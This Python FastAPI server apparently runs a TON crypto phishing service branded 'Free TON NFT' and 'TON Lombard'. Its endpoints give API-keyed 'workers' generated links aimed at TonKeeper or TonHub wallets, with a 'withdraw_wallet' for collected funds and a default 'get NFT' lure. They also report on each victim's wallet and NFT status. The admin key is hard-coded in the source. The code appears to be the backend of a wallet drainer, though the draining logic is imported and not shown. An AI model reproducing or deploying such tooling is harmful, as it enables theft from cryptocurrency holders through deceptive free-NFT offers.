import asyncio
from datetime import datetime, timedelta
from time import sleep
from typing import Annotated
from aiohttp import ClientSession
from fastapi import Body, FastAPI, BackgroundTasks, Header, Response
from asyncio import run as arun
from tonsdk.utils import Address
from ton_pkg import *
import uvicorn
from database import *

cls()

app = FastAPI(
    title='Free TON NFT'
)

admin_key = 'ytfdyuwedhfuweyr847r3rf7u8u8fyg'

async def validate_api_key(api_key):
    if api_key == admin_key:
        return True
    return await get_key(api_key)

@app.post('/api/genurl')
async def generate_worker(
        api_key: Annotated[str | None, Header()] = None,
        withdraw_wallet: Annotated[str | None, Body()] = None,
        target_wallet_type: Annotated[str | None, Body()] = None,
        comment: Annotated[str | None, Body()] = None,
        background_tasks: BackgroundTasks = None,
        res: Response = None
    ):
    if not api_key:
        res.status_code = 403
        return {
            "status": "error",
            "result": {"message": "Set API Key in request headers!"}
        }
    if not await validate_api_key(api_key):
        res.status_code = 401
        return {
            "status": "error",
            "result": {"message": "Invalid API Key!"}
        }
    if not withdraw_wallet:
        res.status_code = 400
        return {
            "status": "error",
            "result": {"message": "Withdraw wallet entered incorrectly."}
        }
    withdraw_wallet = Address(withdraw_wallet).to_string(False, False, False)
    
    if target_wallet_type is None:
        res.status_code = 400
        return {
            "status": "error",
            "result": {"message": "Incorrect wallet type! Should be one of these types: TonKeeper (0) or TonHub (1)!"}
        }
    
    if comment is None:
        comment = 'get NFT'
    
    
    url = await create_url(withdraw_wallet, target_wallet_type, comment)
    
    return {
        "status": "ok",
        "result": {
            "id": url[1],
            "url": url[0]
        }
    }

@app.get("/api/check")
async def checker(
        api_key: Annotated[str | None, Header()] = None,
        id: str = None,
        res: Response = None
    ):
    if not api_key:
        res.status_code = 403
        return {
            "status": "error",
            "message": "Set API Key in request headers!"
        }
    if not await validate_api_key(api_key):
        res.status_code = 401
        return {
            "status": "error",
            "message": "Invalid API Key!"
        }
    
    if not id:
        res.status_code = 400
        return {
            "status": "error",
            "message": "Set ID in query parameters!"
        }
    
    try:
        result = MEMORY[id]
    except:
        res.status_code = 404
        return {
            "status": "error",
            "result": "not_found"
        }
    
    status = {'status': result['status'], 'wallet': result['wallet'], 'nft': result['nft']}
    if result['status'] == 'Ошибка':
        status['error'] = result['error']
        
    return {
        "status": "ok",
        "result": status
    }

@app.post("/api/regapikey")
async def regapikey(
        api_key: Annotated[str | None, Header()] = None,
        new_api: Annotated[str | None, Body()] = None,
        res: Response = None
    ):
    if not api_key:
        res.status_code = 403
        return {
            "status": "error",
            "result": {"message": "Set API Key in request headers!"}
        }
    if not new_api:
        res.status_code = 405
        return {
            "status": "error",
            "result": {"message": "Set new API key!"}
        }
    if api_key != admin_key:
        res.status_code = 401
        return {
            "status": "error",
            "result": {"message": "Invalid API Key!"}
        }
    await reg_key(new_api)
    return {"status": "ok"}

@app.get('/')
def index():
    return 'hello world'

@app.get('/manifest')
def manifest():
    return {
        "url": "https://tonlombard_bot.t.me/",
        "name": "TON Lombard",
        "iconUrl": "https://i.ibb.co/0s4Zdm5/image.png"
    }

uvicorn.run(app, host="0.0.0.0", port=80)
